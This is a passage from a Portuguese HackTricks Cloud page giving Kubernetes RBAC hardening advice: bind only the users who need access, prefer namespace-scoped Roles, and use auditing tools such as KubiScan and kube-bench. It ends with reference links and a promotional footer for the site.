* **Inclus√£o Seletiva**: Garanta que apenas os usu√°rios necess√°rios sejam inclu√≠dos em RoleBindings ou ClusterRoleBindings. Audite regularmente e remova usu√°rios irrelevantes para manter a seguran√ßa rigorosa.

### **Fun√ß√µes Espec√≠ficas do Namespace em Vez de Fun√ß√µes em Toda a Cluster**

* **Fun√ß√µes vs. ClusterRoles**: Prefira usar Fun√ß√µes e RoleBindings para permiss√µes espec√≠ficas do namespace em vez de ClusterRoles e ClusterRoleBindings, que se aplicam a todo o cluster. Esse enfoque oferece um controle mais preciso e limita o escopo das permiss√µes.

### **Utilize ferramentas automatizadas**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Refer√™ncias**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

<details>

<summary><strong>Aprenda hacking AWS do zero ao avan√ßado com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
